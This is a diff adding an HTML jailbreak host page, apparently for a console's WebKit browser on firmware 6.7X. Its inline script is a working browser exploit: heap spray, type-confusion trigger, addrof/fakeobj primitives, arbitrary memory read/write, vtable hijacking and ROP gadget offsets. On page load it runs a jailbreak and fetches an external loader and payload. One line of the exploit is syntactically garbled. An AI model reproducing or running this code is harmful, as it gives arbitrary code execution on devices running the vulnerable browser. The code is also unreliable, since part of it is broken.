@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Elya Host - 6.7X nobd FW</title>
+<style type="text/css">
+:root {
+  --bg-color: #060709;
+  --panel-bg: rgba(12, 14, 20, 0.85);
+  --accent-gold: #f39c12;
+  --accent-green: #2ecc71;
+  --accent-red: #e74c3c;
+  --text-main: #f1f5f9;
+  --text-muted: #94a3b8;
+  --border-glow: rgba(243, 156, 18, 0.5);
+}
+
+body {
+  background-color: var(--bg-color);
+  background-image: radial-gradient(circle at 50% -20%, #1e2235 0%, var(--bg-color) 70%);
+  color: var(--text-main);
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  padding: 25px;
+  min-height: 95vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+
+#container {
+  max-width: 650px;
+  width: 100%;
+  text-align: center;
+  background: var(--panel-bg);
+  backdrop-filter: blur(20px);
+  -webkit-backdrop-filter: blur(20px);
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  border-radius: 24px;
+  padding: 35px;
+  box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
+}
+
+.top-bar {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 25px;
+  font-size: 14px;
+  color: var(--text-muted);
+  font-weight: 600;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+  padding-bottom: 15px;
+}
+
+.stats-row {
+  display: flex;
+  justify-content: center;
+  gap: 20px;
+  margin-bottom: 25px;
+}
+
+.stat-badge {
+  background: rgba(25, 28, 40, 0.9);
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  border-radius: 50px;
+  padding: 8px 20px;
+  font-size: 14px;
+  font-weight: 600;
+  box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+}
+
+.stat-pass { color: var(--accent-green); }
+.stat-fail { color: var(--accent-red); }
+
+.main-title {
+  font-size: 20px;
+  color: var(--accent-gold);
+  margin-bottom: 15px;
+  font-weight: 700;
+  letter-spacing: 0.5px;
+}
+
+#msgs2 {
+  font-size: 16px;
+  color: var(--text-muted);
+  margin-bottom: 30px;
+  font-weight: 500;
+  min-height: 24px;
+}
+
+.content {
+  background: rgba(8, 9, 13, 0.75);
+  border: 1px solid rgba(255, 255, 255, 0.06);
+  border-radius: 20px;
+  padding: 25px;
+  text-align: center;
+  box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.5);
+}
+
+.yellow {
+  color: var(--accent-gold);
+  font-weight: 600;
+}
+
+.hue {
+  color: white;
+  padding: 6px 18px;
+  border-radius: 25px;
+  animation: hue 6s linear infinite;
+  -webkit-animation: hue 6s linear infinite;
+  box-shadow: 0 0 25px rgba(243, 156, 18, 0.5);
+  background: rgba(243, 156, 18, 0.2);
+  font-weight: bold;
+  letter-spacing: 1px;
+  display: inline-block;
+  margin-top: 5px;
+}
+
+@keyframes hue {
+  0% { filter: hue-rotate(0deg); }
+  50% { box-shadow: 0 0 35px var(--accent-gold); }
+  100% { filter: hue-rotate(360deg); }
+}
+
+.special-thanks {
+  margin-top: 20px;
+  font-size: 14px;
+  color: var(--text-muted);
+  border-top: 1px solid rgba(255, 255, 255, 0.08);
+  padding-top: 15px;
+}
+
+.special-thanks span {
+  color: var(--text-main);
+  font-weight: 500;
+}
+</style>
+
+<script>
+var leaker_obj={a:0};var leaker_arr=new Uint32Array(6);var oob_slave=new Uint8Array(1024);var oob_master=new Uint32Array(7);var spray=[];function spray_one(){var x=new Uint32Array(1);x[spray.length+'spray']=123;spray.push(x);}for(var i=0;i<0x10000;i++)spray_one();var target={a:2.1100820415101592e-303,b:false,c:true,d:5678};var target2={a:2.1100820415101592e-303,b:false,c:true,e:5678};var impl_idx=0;function create_impl(){var ans={a:target};for(var i=0;i<32;i++)ans[(impl_idx++)+'x']={};return ans;}function trigger(x){if(impl.a!=target){print("wtf?");while(1);}var o={a:1};for(var i in o){{i=x;function i(){};}o[i];}if(impl.a!=target){print("corrupted!");print(typeof(impl.a));print(impl.a.length);target.c=leaker_obj;leaker_obj.a=leaker_obj;var l1=impl.a[4];var l2=impl.a[5];leaker_obj.a=oob_slave;var s1=impl.a[4];var s2=impl.a[5];target.c=leaker_arr;impl.a[4]=l1;impl.a[5]=l2;target.c=oob_master;impl.a[4]=s1;impl.a[5]=s2;impl.a=target;print([l1,l2,s1,s2]);throw"exploit fucking finished";}}try{for(var _=0;_<1024;_++){var impl=create_impl();var s={a:impl};trigger(s);}}catch(e){print("error: "+e);}function i48_put(x,a){a[4]=x|0;a[5]=(x/4294967296)|0;}function i48_get(a){return a[4]+a[5]*4294967296;}function addrof(x){leaker_obj.a=x;return i48_get(leaker_arr);}function fakeobj(x){i48_put(x,leaker_arr);return leaker_obj.a;}function read_mem_setup(p,sz){i48_put(p,oob_master);oob_master[6]=sz;}function read_mem(p,sz){read_mem_setup(p,sz);var arr=[];for(var i=0;i<sz;i++)arr.push(oob_slave[i]);return arr;}function read_mem_s(p,sz){read_mem_setup(p,sz);return""+oob_slave;}function read_mem_b(p,sz){read_mem_setup(p,sz);var b=new Uint8Array(sz);b.set(oob_slave);return b;}function read_mem_as_string(p,sz){var x=read_mem_b(p,sz);var ans='';for(var i=0;i<x.length;i++)ans+=String.fromCharCode(x[i]);return ans;}function write_mem(p,data){i48_put(p,oob_master);oob_master[6]=data.length;for(var i=0;i<data.length;i++)oob_slave[i]=data[i];}function read_ptr_at(p){var ans=0;var d=read_mem(p,8);for(var i=7;i>=0;i--)ans=256*ans+d[i];return ans;}function write_ptr_at(p,d){var arr=[];for(var i=0;i<8;i++){arr.push(d&0xff);d/=256;}write_mem(p,arr);}function hex(x){return(new Number(x)).toString(16);}var malloc_nogc=[];function malloc(sz){var arr=new Uint8Array(sz);malloc_nogc.push(arr);return read_ptr_at(addrof(arr)+0x10);}var tarea=document.createElement('textarea');var real_vt_ptr=read_ptr_at(addrof(tarea)+0x18);var fake_vt_ptr=malloc(0x400);write_mem(fake_vt_ptr,read_mem(real_vt_ptr,0x400));var real_vtable=read_ptr_at(fake_vt_ptr);var fake_vtable=malloc(0x2000);write_mem(fake_vtable,read_mem(real_vtable,0x2000));write_ptr_at(fake_vt_ptr,fake_vtable);var fake_vt_ptr_bak=malloc(0x400);write_mem(fake_vt_ptr_bak,read_mem(fake_vt_ptr,0x400));var plt_ptr=read_ptr_at(fake_vtable)-10063176;function get_got_addr(idx){var p=plt_ptr+idx*16;var q=read_mem(p,6);if(q[0]!=0xff||q[1]!=0x25)throw"invalid GOT entry";var offset=0;for(var i=5;i>=2;i--)offset=offset*256+q[i];offset+=p+6;return read_ptr_at(offset);}var webkit_base=read_ptr_at(fake_vtable);var libkernel_base=get_got_addr(705)-0x10000;var libc_base=get_got_addr(582);var saveall_addr=libc_base+0x2e2c8;var loadall_addr=libc_base+0x3275c;var setjmp_addr=libc_base+0xbfae0;var longjmp_addr=libc_base+0xbfb30;var pivot_addr=libc_base+0x327d2;var infloop_addr=libc_base+0x447a0;var jop_frame_addr=libc_base+0x715d0;var get_errno_addr_addr=libkernel_base+0x9ff0;var pthread_create_addr=libkernel_base+0xf980;function saveall(){var ans=malloc(0x800);var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);tarea.scrollLeft=0;write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);write_mem(ans,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);write_ptr_at(fake_vt_ptr+0x38,0x1234);write_ptr_ataddroftarea+0x18, fake_vt_ptr;tarea.scrollLeft=0;write_ptr_ataddroftarea+0x18, real_vt_ptr;write_mem(ans+0x400,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));return ans;}function pivot(buf){var ans=malloc(0x400);var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);tarea.scrollLeft=0;write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);write_mem(ans,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,pivot_addr);write_ptr_at(fake_vt_ptr+0x38,buf);write_ptr_at(ans+0x38,read_ptr_at(ans+0x38)-16);write_ptr_at(buf,ans);write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);tarea.scrollLeft=0;write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));}
+</script>
+<script src="jb.js"></script>
+<script>
+function showdate() {
+  var dt = new Date();
+  var Hour = dt.getHours();
+  var Minute = dt.getMinutes();
+  var Day = dt.getDate();
+  var Month = dt.getMonth() + 1;
+  var Year = dt.getFullYear();
+  if (Minute < 10) { Minute = "0" + Minute; };
+  if (Hour < 10) { Hour = "0" + Hour; };
+  document.getElementById("date").innerHTML = (Day + "/" + Month + "/" + Year);
+  document.getElementById("clock").innerHTML = (Hour + ":" + Minute);
+}
+setInterval(showdate, 0);
+</script>
+</head>
+<body onload="setTimeout(load_nobd67X, 50);">
+
+<div id="container">
+  <div class="top-bar">
+    <div><span id="date"></span> &nbsp;|&nbsp; <span id="clock"></span></div>
+    <div>Elya Host - nobd 6.7X FW</div>
+  </div>
+
+  <div class="stats-row">
+    <div class="stat-badge stat-pass">Pass: <span id="passCounter">0</span></div>
+    <div class="stat-badge stat-fail">Fail: <span id="failCounter">0</span></div>
+  </div>
+
+  <h1 class="main-title">ELYA HOST 6.7X NOBD</h1>
+  <div id="msgs2">Status: Initializing...</div>
+
+  <div class="content">
+    <div>
+      <span class="yellow">Designed, Ported and Compiled by :</span><br>
+      <span class="hue">elya</span>
+    </div>
+    <div class="special-thanks">
+      <span>Super Special Thanks To:</span> Sleirsgoevy, AlAzif, LM, &amp; Scene Contributors
+    </div>
+  </div>
+</div>
+
+<script>
+if (localStorage.passcount == null) localStorage.passcount = 0;
+window.passCounter.innerHTML = localStorage.passcount;
+if (localStorage.failcount == null) localStorage.failcount = 0;
+window.failCounter.innerHTML = localStorage.failcount;
+
+function load_nobd67X() {
+  PLfile = 'payload.bin';
+  msgs2.innerHTML = "Payload Loading... please wait";
+  setTimeout(function(){
+    var script = document.createElement('script');
+    script.src = "exp_loader.js";
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }, 3000);
+  setTimeout(jailbreak, 500);
+}
+</script>
+
+</body>
+</html>
